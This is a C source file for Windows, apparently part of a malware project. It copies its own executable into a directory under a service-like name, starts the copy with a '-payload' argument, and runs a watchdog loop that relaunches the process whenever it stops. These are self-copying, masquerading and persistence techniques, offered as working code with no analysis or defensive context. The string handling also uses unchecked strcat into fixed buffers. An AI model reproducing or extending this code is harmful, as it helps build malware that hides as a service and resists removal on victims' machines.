#include <windows.h>
#include <io.h>
#include <stdio.h>

#include "utils.h"

extern char serviceName[64]; // Define a fixed size for serviceName

void startPayload(char * argv[]){
    // Get the destination path
    char destination[MAX_PATH];
    GetDestination(destination);
    strcat(destination, serviceName);    // Add the directory
    strcat(destination, "\\");
    strcat(destination, serviceName);    // Add the service name
    strcat(destination, ".exe");         // Add the extension

    // Check if the file exists
    if(_access(destination, 0) == -1){
        CopyFileA(argv[0], destination, FALSE); // Copy the file
        return;
    }

    StartProgram(argv[0], destination, "-payload");
}

void watchdog(char * argv[]){
    // SetParent(GetConsoleWindow(), NULL); // Unlink the process from the parent
    // Get the process name
    char processName[sizeof(serviceName) + 4];
    strcpy(processName, serviceName);
    strcat(processName, ".exe");

    int firstRun = 1;

    // Watchdog process
    while(1){
        // Check if the process is running
        if(findFirstProc(processName) == 0){
            // Start the executable
            startPayload(argv);

            if(firstRun){
                firstRun = 0;
                Sleep(3000);
            }
        }
        Sleep(100);
    }
}